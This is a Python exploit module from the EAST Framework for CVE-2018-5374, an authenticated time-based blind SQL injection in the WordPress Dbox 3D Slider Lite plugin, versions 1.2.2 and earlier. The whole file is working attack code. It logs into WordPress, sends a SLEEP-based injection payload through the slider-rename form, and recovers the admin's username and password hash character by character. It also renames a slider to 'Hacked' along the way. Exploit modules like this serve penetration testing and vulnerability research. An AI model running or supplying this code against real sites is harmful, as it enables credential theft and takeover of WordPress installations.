#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import urllib
import urllib2
import time
import string
import cookielib
from collections import OrderedDict

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_wordpress_dbox_3d_slider_lite_bsqli"
INFO['DESCRIPTION'] = "Wordpress Dbox 3D Slider Lite <= 1.2.2 - SQL Injection"
INFO['VENDOR'] = "https://wordpress.org/plugins/dbox-slider-lite/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['http://seclists.org/bugtraq/2018/Jan/32']
INFO["CVE Name"] = "CVE-2018-5374"
INFO["NOTES"] = """SQL injection vulnerability in Dbox 3D Slider Lite WordPress plugin"""

INFO['CHANGELOG'] = "15 Jan, 2018. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = "80", dict(description = 'Target port')
OPTIONS["BASEPATH"] = '/wordpress', dict(description = 'Basepath')
OPTIONS["USERNAME"] = 'admin', dict(description = 'Registered user')
OPTIONS["PASSWORD"] = 'password', dict(description = 'Password')
OPTIONS["SSL"] = False, dict(description = 'Use SSL')
OPTIONS["TTL"] = 5, dict(description = '')

class exploit(Sploit):
    def __init__(self, host="", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.ssl = False
        self.ttl = 5
        self.basepath = "/"
        self.username = ''
        self.password = ''
        self.pool = string.ascii_letters + string.digits + ':$/\\+.'
        self.cookie = ''
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.username = self.args.get('USERNAME', self.username)
        self.password = self.args.get('PASSWORD', self.password)
        self.ssl = self.args.get('SSL', self.ssl)
        self.ttl = int(self.args.get('TTL', self.ttl))
        
        self.cookiesjar = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookiesjar))
        urllib2.install_opener(opener)
        
        self.url = self.make_url('/wp-admin/admin.php?page=dboxlite-slider-admin')
        self.data = "rename_slider_to=Hacked&rename_slider=Rename&active_tab=0&current_slider_id=1 AND (SELECT * FROM (select IF((SUBSTRING((SELECT CONCAT(user_login,CHAR(58),user_pass) FROM wp_users where id=1),{pos},1)) = CHAR({char}), SLEEP({ttl}), 1))A)".replace(' ', '%20')
    
    def make_url(self, path = ''):
        return '{}{}:{}{}{}'.format(self.prot(), self.host, self.port, self.basepath, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'

    def auth_wordpress(self, username, password):

        url = self.make_url('/wp-login.php')
        data = 'log={}&pwd={}&redirect_to=&testcookie=0&wp-submit=%D0%92%D0%BE%D0%B9%D1%82%D0%B8'.format(username, password)
        
        fd = urllib2.urlopen(url)
        init_cookie = fd.headers['Set-Cookie']
        
        request = urllib2.Request(url, data)
        request.add_header('Cookie', init_cookie)
        fd = urllib2.urlopen(request)

        power_cookie = ''
        for k in self.cookiesjar:
            power_cookie += k.name + '=' + k.value + ';'
        return power_cookie
        
    def guess_letter(self, pos):
        for c in self.pool:
            data = self.data.format(pos=pos, char=ord(c), ttl=self.ttl)
            request = urllib2.Request(self.url, data)
            request.add_header('Cookie', self.cookie)
            start = time.time()
            try:
                urllib2.urlopen(request).read()
            except:
                pass
            if time.time() - start >= self.ttl:
                return c
        return None
        
    def run(self):
        self.args()
        
        self.cookie = self.auth_wordpress(self.username, self.password)
        self.log('Authorization successful!')
        self.log('Begin extracting admin\'s credentials')

        i, result = 1, ''
        char = self.guess_letter(i)
        while char:
            i += 1
            result += char
            self.log('Current result: ' + result)
            char = self.guess_letter(i)

        if result:
            self.log('Output format username:hash-password')
            self.log('=' * 60)
            self.log('End with: {}'.format(result))
            self.log('=' * 60)
            self.finish(True)
        
        self.finish(False)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
